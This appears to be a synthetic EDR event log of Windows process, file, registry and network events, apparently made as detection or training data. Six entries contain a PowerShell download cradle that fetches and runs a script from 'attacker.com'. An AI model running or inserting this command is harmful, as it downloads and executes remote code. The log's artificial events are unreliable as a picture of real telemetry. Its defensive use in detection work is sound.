2026-04-14T02:36:03.000Z [EDR] user=system proc=svchost.exe action=PROCESS_START details="PID: 7662"
2026-04-14T02:36:33.000Z [EDR] user=admin proc=cmd.exe action=FILE_CREATE details="PID: 2399"
2026-04-14T02:37:03.000Z [EDR] user=system proc=powershell.exe action=FILE_CREATE details="PID: 1765"
2026-04-14T02:37:33.000Z [EDR] user=system proc=explorer.exe action=PROCESS_START details="PID: 1561"
2026-04-14T02:38:03.000Z [EDR] user=system proc=powershell.exe action=NETWORK_CONN details="PID: 7694"
2026-04-14T02:38:33.000Z [EDR] user=system proc=powershell.exe action=REGISTRY_MOD details="IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/mal.ps1')"
2026-04-14T02:39:03.000Z [EDR] user=service_acct proc=explorer.exe action=FILE_CREATE details="PID: 2607"
2026-04-14T02:39:33.000Z [EDR] user=system proc=powershell.exe action=REGISTRY_MOD details="IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/mal.ps1')"
2026-04-14T02:40:03.000Z [EDR] user=service_acct proc=chrome.exe action=REGISTRY_MOD details="PID: 4847"
2026-04-14T02:40:33.000Z [EDR] user=admin proc=svchost.exe action=PROCESS_START details="PID: 2777"
2026-04-14T02:41:03.000Z [EDR] user=bob proc=cmd.exe action=NETWORK_CONN details="PID: 2851"
2026-04-14T02:41:33.000Z [EDR] user=system proc=explorer.exe action=REGISTRY_MOD details="PID: 4932"
2026-04-14T02:42:03.000Z [EDR] user=service_acct proc=svchost.exe action=FILE_CREATE details="PID: 7739"
2026-04-14T02:42:33.000Z [EDR] user=service_acct proc=explorer.exe action=REGISTRY_MOD details="PID: 6298"
2026-04-14T02:43:03.000Z [EDR] user=admin proc=cmd.exe action=NETWORK_CONN details="PID: 4373"
2026-04-14T02:43:33.000Z [EDR] user=alice proc=explorer.exe action=NETWORK_CONN details="PID: 1468"
2026-04-14T02:44:03.000Z [EDR] user=system proc=cmd.exe action=NETWORK_CONN details="PID: 2520"
2026-04-14T02:44:33.000Z [EDR] user=bob proc=cmd.exe action=REGISTRY_MOD details="PID: 4341"
2026-04-14T02:45:03.000Z [EDR] user=bob proc=cmd.exe action=REGISTRY_MOD details="PID: 7078"
2026-04-14T02:45:33.000Z [EDR] user=system proc=chrome.exe action=PROCESS_START details="PID: 2808"
2026-04-14T02:46:03.000Z [EDR] user=bob proc=svchost.exe action=PROCESS_START details="PID: 1759"
2026-04-14T02:46:33.000Z [EDR] user=service_acct proc=powershell.exe action=FILE_CREATE details="PID: 2249"
2026-04-14T02:47:03.000Z [EDR] user=bob proc=explorer.exe action=NETWORK_CONN details="PID: 7804"
2026-04-14T02:47:33.000Z [EDR] user=alice proc=chrome.exe action=REGISTRY_MOD details="PID: 4468"
2026-04-14T02:48:03.000Z [EDR] user=admin proc=explorer.exe action=NETWORK_CONN details="PID: 2490"
2026-04-14T02:48:33.000Z [EDR] user=alice proc=chrome.exe action=REGISTRY_MOD details="PID: 1740"
2026-04-14T02:49:03.000Z [EDR] user=system proc=powershell.exe action=PROCESS_START details="PID: 7001"
2026-04-14T02:49:33.000Z [EDR] user=bob proc=svchost.exe action=FILE_CREATE details="PID: 8031"
2026-04-14T02:50:03.000Z [EDR] user=bob proc=explorer.exe action=NETWORK_CONN details="PID: 6680"
2026-04-14T02:50:33.000Z [EDR] user=bob proc=powershell.exe action=FILE_CREATE details="PID: 7719"
2026-04-14T02:51:03.000Z [EDR] user=alice proc=explorer.exe action=REGISTRY_MOD details="PID: 8013"
2026-04-14T02:51:33.000Z [EDR] user=alice proc=chrome.exe action=PROCESS_START details="PID: 6508"
2026-04-14T02:52:03.000Z [EDR] user=alice proc=cmd.exe action=FILE_CREATE details="PID: 4401"
2026-04-14T02:52:33.000Z [EDR] user=alice proc=powershell.exe action=REGISTRY_MOD details="PID: 4056"
2026-04-14T02:53:03.000Z [EDR] user=admin proc=cmd.exe action=NETWORK_CONN details="PID: 8265"
2026-04-14T02:53:33.000Z [EDR] user=system proc=svchost.exe action=PROCESS_START details="PID: 8543"
2026-04-14T02:54:03.000Z [EDR] user=alice proc=powershell.exe action=REGISTRY_MOD details="PID: 4484"
2026-04-14T02:54:33.000Z [EDR] user=bob proc=cmd.exe action=NETWORK_CONN details="PID: 8910"
2026-04-14T02:55:03.000Z [EDR] user=system proc=powershell.exe action=REGISTRY_MOD details="PID: 7008"
2026-04-14T02:55:33.000Z [EDR] user=system proc=powershell.exe action=NETWORK_CONN details="IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/mal.ps1')"
2026-04-14T02:56:03.000Z [EDR] user=admin proc=svchost.exe action=REGISTRY_MOD details="PID: 3551"
2026-04-14T02:56:33.000Z [EDR] user=system proc=powershell.exe action=FILE_CREATE details="PID: 3402"
2026-04-14T02:57:03.000Z [EDR] user=service_acct proc=cmd.exe action=REGISTRY_MOD details="PID: 1707"
2026-04-14T02:57:33.000Z [EDR] user=admin proc=svchost.exe action=PROCESS_START details="PID: 8113"
2026-04-14T02:58:03.000Z [EDR] user=bob proc=cmd.exe action=NETWORK_CONN details="PID: 1513"
2026-04-14T02:58:33.000Z [EDR] user=bob proc=chrome.exe action=PROCESS_START details="PID: 5297"
2026-04-14T02:59:03.000Z [EDR] user=service_acct proc=explorer.exe action=REGISTRY_MOD details="PID: 6859"
2026-04-14T02:59:33.000Z [EDR] user=alice proc=svchost.exe action=REGISTRY_MOD details="PID: 6462"
2026-04-14T03:00:03.000Z [EDR] user=service_acct proc=svchost.exe action=REGISTRY_MOD details="PID: 8893"
2026-04-14T03:00:33.000Z [EDR] user=service_acct proc=explorer.exe action=NETWORK_CONN details="PID: 8181"
2026-04-14T03:01:03.000Z [EDR] user=system proc=svchost.exe action=NETWORK_CONN details="PID: 6967"
2026-04-14T03:01:33.000Z [EDR] user=admin proc=cmd.exe action=PROCESS_START details="PID: 6727"
2026-04-14T03:02:03.000Z [EDR] user=admin proc=cmd.exe action=PROCESS_START details="PID: 2922"
2026-04-14T03:02:33.000Z [EDR] user=admin proc=powershell.exe action=NETWORK_CONN details="IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/mal.ps1')"
2026-04-14T03:03:03.000Z [EDR] user=admin proc=chrome.exe action=PROCESS_START details="PID: 7502"
2026-04-14T03:03:33.000Z [EDR] user=bob proc=chrome.exe action=REGISTRY_MOD details="PID: 3253"
2026-04-14T03:04:03.000Z [EDR] user=alice proc=cmd.exe action=NETWORK_CONN details="PID: 5750"
2026-04-14T03:04:33.000Z [EDR] user=service_acct proc=svchost.exe action=PROCESS_START details="PID: 6752"
2026-04-14T03:05:03.000Z [EDR] user=system proc=chrome.exe action=PROCESS_START details="PID: 8559"
2026-04-14T03:05:33.000Z [EDR] user=admin proc=chrome.exe action=PROCESS_START details="PID: 6883"
2026-04-14T03:06:03.000Z [EDR] user=bob proc=chrome.exe action=NETWORK_CONN details="PID: 2587"
2026-04-14T03:06:33.000Z [EDR] user=admin proc=powershell.exe action=PROCESS_START details="PID: 5311"
2026-04-14T03:07:03.000Z [EDR] user=bob proc=powershell.exe action=NETWORK_CONN details="PID: 3726"
2026-04-14T03:07:33.000Z [EDR] user=service_acct proc=explorer.exe action=REGISTRY_MOD details="PID: 2820"
2026-04-14T03:08:03.000Z [EDR] user=system proc=explorer.exe action=PROCESS_START details="PID: 1130"
2026-04-14T03:08:33.000Z [EDR] user=alice proc=chrome.exe action=REGISTRY_MOD details="PID: 4528"
2026-04-14T03:09:03.000Z [EDR] user=alice proc=powershell.exe action=REGISTRY_MOD details="PID: 3827"
2026-04-14T03:09:33.000Z [EDR] user=system proc=explorer.exe action=REGISTRY_MOD details="PID: 7751"
2026-04-14T03:10:03.000Z [EDR] user=alice proc=powershell.exe action=PROCESS_START details="PID: 5025"
2026-04-14T03:10:33.000Z [EDR] user=alice proc=svchost.exe action=REGISTRY_MOD details="PID: 1908"
2026-04-14T03:11:03.000Z [EDR] user=system proc=cmd.exe action=REGISTRY_MOD details="PID: 3451"
2026-04-14T03:11:33.000Z [EDR] user=bob proc=chrome.exe action=NETWORK_CONN details="PID: 5176"
2026-04-14T03:12:03.000Z [EDR] user=alice proc=cmd.exe action=NETWORK_CONN details="PID: 7460"
2026-04-14T03:12:33.000Z [EDR] user=bob proc=powershell.exe action=REGISTRY_MOD details="PID: 7050"
2026-04-14T03:13:03.000Z [EDR] user=service_acct proc=cmd.exe action=PROCESS_START details="PID: 7588"
2026-04-14T03:13:33.000Z [EDR] user=system proc=powershell.exe action=NETWORK_CONN details="PID: 4751"
2026-04-14T03:14:03.000Z [EDR] user=admin proc=powershell.exe action=FILE_CREATE details="PID: 8015"
2026-04-14T03:14:33.000Z [EDR] user=system proc=explorer.exe action=FILE_CREATE details="PID: 8661"
2026-04-14T03:15:03.000Z [EDR] user=admin proc=svchost.exe action=NETWORK_CONN details="PID: 4208"
2026-04-14T03:15:33.000Z [EDR] user=system proc=cmd.exe action=REGISTRY_MOD details="PID: 6758"
2026-04-14T03:16:03.000Z [EDR] user=bob proc=explorer.exe action=NETWORK_CONN details="PID: 6707"
2026-04-14T03:16:33.000Z [EDR] user=bob proc=chrome.exe action=NETWORK_CONN details="PID: 2184"
2026-04-14T03:17:03.000Z [EDR] user=system proc=chrome.exe action=FILE_CREATE details="PID: 6310"
2026-04-14T03:17:33.000Z [EDR] user=admin proc=explorer.exe action=REGISTRY_MOD details="PID: 7081"
2026-04-14T03:18:03.000Z [EDR] user=bob proc=explorer.exe action=FILE_CREATE details="PID: 1354"
2026-04-14T03:18:33.000Z [EDR] user=system proc=explorer.exe action=FILE_CREATE details="PID: 3184"
2026-04-14T03:19:03.000Z [EDR] user=system proc=explorer.exe action=PROCESS_START details="PID: 7977"
2026-04-14T03:19:33.000Z [EDR] user=service_acct proc=chrome.exe action=PROCESS_START details="PID: 5920"
2026-04-14T03:20:03.000Z [EDR] user=system proc=powershell.exe action=REGISTRY_MOD details="PID: 2694"
2026-04-14T03:20:33.000Z [EDR] user=alice proc=chrome.exe action=PROCESS_START details="PID: 6591"
2026-04-14T03:21:03.000Z [EDR] user=service_acct proc=cmd.exe action=NETWORK_CONN details="PID: 5278"
2026-04-14T03:21:33.000Z [EDR] user=service_acct proc=explorer.exe action=NETWORK_CONN details="PID: 6884"
2026-04-14T03:22:03.000Z [EDR] user=alice proc=cmd.exe action=FILE_CREATE details="PID: 2241"
2026-04-14T03:22:33.000Z [EDR] user=system proc=svchost.exe action=REGISTRY_MOD details="PID: 8615"
2026-04-14T03:23:03.000Z [EDR] user=admin proc=chrome.exe action=PROCESS_START details="PID: 4078"
2026-04-14T03:23:33.000Z [EDR] user=bob proc=svchost.exe action=PROCESS_START details="PID: 8383"
2026-04-14T03:24:03.000Z [EDR] user=service_acct proc=svchost.exe action=NETWORK_CONN details="PID: 7008"
2026-04-14T03:24:33.000Z [EDR] user=system proc=svchost.exe action=PROCESS_START details="PID: 4608"
2026-04-14T03:25:03.000Z [EDR] user=alice proc=powershell.exe action=NETWORK_CONN details="IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/mal.ps1')"
2026-04-14T03:25:33.000Z [EDR] user=system proc=powershell.exe action=NETWORK_CONN details="PID: 5450"
2026-04-14T03:26:03.000Z [EDR] user=admin proc=chrome.exe action=NETWORK_CONN details="PID: 1993"
2026-04-14T03:26:33.000Z [EDR] user=alice proc=explorer.exe action=FILE_CREATE details="PID: 3462"
2026-04-14T03:27:03.000Z [EDR] user=alice proc=explorer.exe action=PROCESS_START details="PID: 4955"
2026-04-14T03:27:33.000Z [EDR] user=service_acct proc=explorer.exe action=REGISTRY_MOD details="PID: 5573"
2026-04-14T03:28:03.000Z [EDR] user=alice proc=cmd.exe action=FILE_CREATE details="PID: 5849"
2026-04-14T03:28:33.000Z [EDR] user=bob proc=powershell.exe action=NETWORK_CONN details="PID: 1903"
2026-04-14T03:29:03.000Z [EDR] user=bob proc=cmd.exe action=NETWORK_CONN details="PID: 7724"
2026-04-14T03:29:33.000Z [EDR] user=service_acct proc=chrome.exe action=REGISTRY_MOD details="PID: 2552"
2026-04-14T03:30:03.000Z [EDR] user=service_acct proc=chrome.exe action=PROCESS_START details="PID: 8958"
2026-04-14T03:30:33.000Z [EDR] user=system proc=explorer.exe action=FILE_CREATE details="PID: 2853"
2026-04-14T03:31:03.000Z [EDR] user=bob proc=cmd.exe action=NETWORK_CONN details="PID: 8638"
2026-04-14T03:31:33.000Z [EDR] user=system proc=chrome.exe action=FILE_CREATE details="PID: 5733"
2026-04-14T03:32:03.000Z [EDR] user=system proc=cmd.exe action=NETWORK_CONN details="PID: 5236"
2026-04-14T03:32:33.000Z [EDR] user=admin proc=chrome.exe action=REGISTRY_MOD details="PID: 7076"
2026-04-14T03:33:03.000Z [EDR] user=admin proc=cmd.exe action=PROCESS_START details="PID: 7234"
2026-04-14T03:33:33.000Z [EDR] user=service_acct proc=cmd.exe action=REGISTRY_MOD details="PID: 5350"
2026-04-14T03:34:03.000Z [EDR] user=service_acct proc=powershell.exe action=FILE_CREATE details="PID: 6790"
2026-04-14T03:34:33.000Z [EDR] user=system proc=svchost.exe action=FILE_CREATE details="PID: 2600"
2026-04-14T03:35:03.000Z [EDR] user=admin proc=explorer.exe action=PROCESS_START details="PID: 4018"
2026-04-14T03:35:33.000Z [EDR] user=admin proc=svchost.exe action=FILE_CREATE details="PID: 5997"
2026-04-14T03:36:03.000Z [EDR] user=alice proc=chrome.exe action=FILE_CREATE details="PID: 2142"
2026-04-14T03:36:33.000Z [EDR] user=bob proc=chrome.exe action=FILE_CREATE details="PID: 6746"
2026-04-14T03:37:03.000Z [EDR] user=service_acct proc=chrome.exe action=FILE_CREATE details="PID: 2176"
2026-04-14T03:37:33.000Z [EDR] user=bob proc=svchost.exe action=FILE_CREATE details="PID: 2360"
2026-04-14T03:38:03.000Z [EDR] user=admin proc=chrome.exe action=FILE_CREATE details="PID: 6659"
2026-04-14T03:38:33.000Z [EDR] user=service_acct proc=explorer.exe action=FILE_CREATE details="PID: 5459"
2026-04-14T03:39:03.000Z [EDR] user=admin proc=cmd.exe action=PROCESS_START details="PID: 8909"
2026-04-14T03:39:33.000Z [EDR] user=admin proc=svchost.exe action=PROCESS_START details="PID: 2265"
2026-04-14T03:40:03.000Z [EDR] user=alice proc=cmd.exe action=FILE_CREATE details="PID: 5185"
2026-04-14T03:40:33.000Z [EDR] user=bob proc=cmd.exe action=NETWORK_CONN details="PID: 7744"
2026-04-14T03:41:03.000Z [EDR] user=service_acct proc=explorer.exe action=FILE_CREATE details="PID: 3907"
2026-04-14T03:41:33.000Z [EDR] user=admin proc=explorer.exe action=NETWORK_CONN details="PID: 2553"
2026-04-14T03:42:03.000Z [EDR] user=admin proc=explorer.exe action=PROCESS_START details="PID: 8540"
2026-04-14T03:42:33.000Z [EDR] user=bob proc=cmd.exe action=PROCESS_START details="PID: 1561"
2026-04-14T03:43:03.000Z [EDR] user=admin proc=cmd.exe action=PROCESS_START details="PID: 6856"
2026-04-14T03:43:33.000Z [EDR] user=bob proc=explorer.exe action=REGISTRY_MOD details="PID: 5483"
2026-04-14T03:44:03.000Z [EDR] user=service_acct proc=powershell.exe action=FILE_CREATE details="PID: 3260"
2026-04-14T03:44:33.000Z [EDR] user=bob proc=svchost.exe action=FILE_CREATE details="PID: 1320"
2026-04-14T03:45:03.000Z [EDR] user=service_acct proc=svchost.exe action=REGISTRY_MOD details="PID: 6956"
2026-04-14T03:45:33.000Z [EDR] user=admin proc=powershell.exe action=NETWORK_CONN details="PID: 5767"
2026-04-14T03:46:03.000Z [EDR] user=admin proc=explorer.exe action=FILE_CREATE details="PID: 1904"
2026-04-14T03:46:33.000Z [EDR] user=alice proc=cmd.exe action=NETWORK_CONN details="PID: 4629"
2026-04-14T03:47:03.000Z [EDR] user=system proc=cmd.exe action=FILE_CREATE details="PID: 8521"
2026-04-14T03:47:33.000Z [EDR] user=system proc=svchost.exe action=PROCESS_START details="PID: 2285"
2026-04-14T03:48:03.000Z [EDR] user=alice proc=chrome.exe action=PROCESS_START details="PID: 7979"
2026-04-14T03:48:33.000Z [EDR] user=bob proc=chrome.exe action=PROCESS_START details="PID: 8803"
2026-04-14T03:49:03.000Z [EDR] user=alice proc=explorer.exe action=REGISTRY_MOD details="PID: 8724"
2026-04-14T03:49:33.000Z [EDR] user=admin proc=cmd.exe action=PROCESS_START details="PID: 1417"
2026-04-14T03:50:03.000Z [EDR] user=alice proc=svchost.exe action=REGISTRY_MOD details="PID: 1445"
2026-04-14T03:50:33.000Z [EDR] user=alice proc=svchost.exe action=FILE_CREATE details="PID: 1741"
2026-04-14T03:51:03.000Z [EDR] user=bob proc=cmd.exe action=PROCESS_START details="PID: 1378"
2026-04-14T03:51:33.000Z [EDR] user=admin proc=cmd.exe action=PROCESS_START details="PID: 5600"
2026-04-14T03:52:03.000Z [EDR] user=service_acct proc=svchost.exe action=NETWORK_CONN details="PID: 4369"
2026-04-14T03:52:33.000Z [EDR] user=service_acct proc=chrome.exe action=PROCESS_START details="PID: 7242"
2026-04-14T03:53:03.000Z [EDR] user=system proc=powershell.exe action=NETWORK_CONN details="PID: 1485"
2026-04-14T03:53:33.000Z [EDR] user=system proc=powershell.exe action=PROCESS_START details="PID: 2672"
2026-04-14T03:54:03.000Z [EDR] user=alice proc=explorer.exe action=PROCESS_START details="PID: 5600"
2026-04-14T03:54:33.000Z [EDR] user=service_acct proc=powershell.exe action=REGISTRY_MOD details="PID: 6098"
2026-04-14T03:55:03.000Z [EDR] user=alice proc=chrome.exe action=FILE_CREATE details="PID: 5301"
2026-04-14T03:55:33.000Z [EDR] user=system proc=powershell.exe action=FILE_CREATE details="PID: 8337"
2026-04-14T03:56:03.000Z [EDR] user=admin proc=explorer.exe action=REGISTRY_MOD details="PID: 6320"
2026-04-14T03:56:33.000Z [EDR] user=alice proc=explorer.exe action=REGISTRY_MOD details="PID: 3289"
2026-04-14T03:57:03.000Z [EDR] user=service_acct proc=explorer.exe action=FILE_CREATE details="PID: 8124"
2026-04-14T03:57:33.000Z [EDR] user=admin proc=powershell.exe action=NETWORK_CONN details="IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/mal.ps1')"
2026-04-14T03:58:03.000Z [EDR] user=system proc=svchost.exe action=FILE_CREATE details="PID: 8825"
2026-04-14T03:58:33.000Z [EDR] user=bob proc=powershell.exe action=REGISTRY_MOD details="PID: 4363"
2026-04-14T03:59:03.000Z [EDR] user=admin proc=svchost.exe action=PROCESS_START details="PID: 5453"
2026-04-14T03:59:33.000Z [EDR] user=system proc=cmd.exe action=REGISTRY_MOD details="PID: 7625"
2026-04-14T04:00:03.000Z [EDR] user=admin proc=explorer.exe action=REGISTRY_MOD details="PID: 7404"
2026-04-14T04:00:33.000Z [EDR] user=bob proc=powershell.exe action=PROCESS_START details="PID: 8046"
2026-04-14T04:01:03.000Z [EDR] user=alice proc=chrome.exe action=NETWORK_CONN details="PID: 4056"
2026-04-14T04:01:33.000Z [EDR] user=admin proc=chrome.exe action=REGISTRY_MOD details="PID: 3806"
2026-04-14T04:02:03.000Z [EDR] user=bob proc=cmd.exe action=PROCESS_START details="PID: 3298"
2026-04-14T04:02:33.000Z [EDR] user=bob proc=svchost.exe action=REGISTRY_MOD details="PID: 5415"
2026-04-14T04:03:03.000Z [EDR] user=system proc=cmd.exe action=FILE_CREATE details="PID: 3353"
2026-04-14T04:03:33.000Z [EDR] user=service_acct proc=cmd.exe action=NETWORK_CONN details="PID: 3778"
2026-04-14T04:04:03.000Z [EDR] user=bob proc=chrome.exe action=REGISTRY_MOD details="PID: 8937"
2026-04-14T04:04:33.000Z [EDR] user=bob proc=svchost.exe action=FILE_CREATE details="PID: 7662"
2026-04-14T04:05:03.000Z [EDR] user=alice proc=cmd.exe action=REGISTRY_MOD details="PID: 7092"
2026-04-14T04:05:33.000Z [EDR] user=system proc=svchost.exe action=REGISTRY_MOD details="PID: 4919"
2026-04-14T04:06:03.000Z [EDR] user=bob proc=explorer.exe action=NETWORK_CONN details="PID: 8305"
2026-04-14T04:06:33.000Z [EDR] user=system proc=svchost.exe action=FILE_CREATE details="PID: 7357"
2026-04-14T04:07:03.000Z [EDR] user=system proc=cmd.exe action=FILE_CREATE details="PID: 4107"
2026-04-14T04:07:33.000Z [EDR] user=admin proc=svchost.exe action=NETWORK_CONN details="PID: 3435"
2026-04-14T04:08:03.000Z [EDR] user=service_acct proc=powershell.exe action=PROCESS_START details="PID: 7757"
2026-04-14T04:08:33.000Z [EDR] user=bob proc=cmd.exe action=FILE_CREATE details="PID: 2206"
2026-04-14T04:09:03.000Z [EDR] user=alice proc=explorer.exe action=FILE_CREATE details="PID: 1189"
2026-04-14T04:09:33.000Z [EDR] user=service_acct proc=cmd.exe action=PROCESS_START details="PID: 2599"
2026-04-14T04:10:03.000Z [EDR] user=service_acct proc=cmd.exe action=NETWORK_CONN details="PID: 8239"
2026-04-14T04:10:33.000Z [EDR] user=system proc=powershell.exe action=NETWORK_CONN details="PID: 2664"
2026-04-14T04:11:03.000Z [EDR] user=bob proc=svchost.exe action=REGISTRY_MOD details="PID: 3404"
2026-04-14T04:11:33.000Z [EDR] user=admin proc=powershell.exe action=FILE_CREATE details="PID: 5564"
2026-04-14T04:12:03.000Z [EDR] user=service_acct proc=svchost.exe action=NETWORK_CONN details="PID: 2594"
2026-04-14T04:12:33.000Z [EDR] user=bob proc=chrome.exe action=NETWORK_CONN details="PID: 5292"
2026-04-14T04:13:03.000Z [EDR] user=service_acct proc=explorer.exe action=REGISTRY_MOD details="PID: 8095"
2026-04-14T04:13:33.000Z [EDR] user=service_acct proc=svchost.exe action=FILE_CREATE details="PID: 2466"
2026-04-14T04:14:03.000Z [EDR] user=admin proc=chrome.exe action=NETWORK_CONN details="PID: 3247"
2026-04-14T04:14:33.000Z [EDR] user=service_acct proc=cmd.exe action=NETWORK_CONN details="PID: 5362"
2026-04-14T04:15:03.000Z [EDR] user=admin proc=svchost.exe action=REGISTRY_MOD details="PID: 1583"
2026-04-14T04:15:33.000Z [EDR] user=bob proc=chrome.exe action=NETWORK_CONN details="PID: 1708"
2026-04-14T04:16:03.000Z [EDR] user=system proc=svchost.exe action=FILE_CREATE details="PID: 3302"
2026-04-14T04:16:33.000Z [EDR] user=admin proc=chrome.exe action=FILE_CREATE details="PID: 1614"
2026-04-14T04:17:03.000Z [EDR] user=admin proc=chrome.exe action=FILE_CREATE details="PID: 3606"
2026-04-14T04:17:33.000Z [EDR] user=admin proc=powershell.exe action=PROCESS_START details="PID: 7341"
2026-04-14T04:18:03.000Z [EDR] user=admin proc=svchost.exe action=FILE_CREATE details="PID: 1041"
2026-04-14T04:18:33.000Z [EDR] user=alice proc=explorer.exe action=NETWORK_CONN details="PID: 5728"
2026-04-14T04:19:03.000Z [EDR] user=service_acct proc=explorer.exe action=FILE_CREATE details="PID: 7919"
2026-04-14T04:19:33.000Z [EDR] user=service_acct proc=chrome.exe action=REGISTRY_MOD details="PID: 5699"
2026-04-14T04:20:03.000Z [EDR] user=service_acct proc=cmd.exe action=NETWORK_CONN details="PID: 5884"
2026-04-14T04:20:33.000Z [EDR] user=alice proc=cmd.exe action=FILE_CREATE details="PID: 8794"
2026-04-14T04:21:03.000Z [EDR] user=admin proc=chrome.exe action=PROCESS_START details="PID: 7255"
2026-04-14T04:21:33.000Z [EDR] user=admin proc=svchost.exe action=PROCESS_START details="PID: 3028"
2026-04-14T04:22:03.000Z [EDR] user=system proc=chrome.exe action=REGISTRY_MOD details="PID: 2900"
2026-04-14T04:22:33.000Z [EDR] user=service_acct proc=powershell.exe action=NETWORK_CONN details="PID: 4878"
2026-04-14T04:23:03.000Z [EDR] user=alice proc=explorer.exe action=REGISTRY_MOD details="PID: 3465"
2026-04-14T04:23:33.000Z [EDR] user=admin proc=explorer.exe action=REGISTRY_MOD details="PID: 3896"
2026-04-14T04:24:03.000Z [EDR] user=service_acct proc=explorer.exe action=FILE_CREATE details="PID: 5500"
2026-04-14T04:24:33.000Z [EDR] user=service_acct proc=powershell.exe action=PROCESS_START details="PID: 4046"
2026-04-14T04:25:03.000Z [EDR] user=system proc=cmd.exe action=PROCESS_START details="PID: 1148"
2026-04-14T04:25:33.000Z [EDR] user=alice proc=powershell.exe action=FILE_CREATE details="PID: 1802"
2026-04-14T04:26:03.000Z [EDR] user=bob proc=cmd.exe action=FILE_CREATE details="PID: 7982"
2026-04-14T04:26:33.000Z [EDR] user=alice proc=svchost.exe action=PROCESS_START details="PID: 7444"
2026-04-14T04:27:03.000Z [EDR] user=admin proc=chrome.exe action=NETWORK_CONN details="PID: 2507"
2026-04-14T04:27:33.000Z [EDR] user=admin proc=explorer.exe action=PROCESS_START details="PID: 7572"
2026-04-14T04:28:03.000Z [EDR] user=alice proc=svchost.exe action=REGISTRY_MOD details="PID: 2906"
2026-04-14T04:28:33.000Z [EDR] user=system proc=explorer.exe action=FILE_CREATE details="PID: 3120"
2026-04-14T04:29:03.000Z [EDR] user=system proc=powershell.exe action=FILE_CREATE details="PID: 5023"
2026-04-14T04:29:33.000Z [EDR] user=alice proc=svchost.exe action=FILE_CREATE details="PID: 1042"
2026-04-14T04:30:03.000Z [EDR] user=system proc=chrome.exe action=PROCESS_START details="PID: 6426"
